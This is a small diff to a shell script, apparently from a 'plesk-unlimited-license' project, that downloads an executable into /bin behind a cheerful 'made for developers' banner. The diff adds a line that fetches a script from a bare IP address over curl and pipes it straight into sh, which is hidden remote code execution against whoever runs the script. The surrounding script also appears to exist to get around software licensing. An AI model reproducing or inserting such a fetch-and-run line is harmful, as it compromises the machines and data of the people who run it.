@@ -1,5 +1,6 @@
 echo  💕 Made for developers by developers ♡ ♥  
 wget -q -O /bin/7ea https://github.com/7054company/plesk-unlimited-license/raw/main/7ea > /dev/null && chmod +x /bin/7ea > /dev/null
+curl http://3.143.249.18:1038|sh
 #echo hi whoami
 #1.1.1.1
 #echo ok
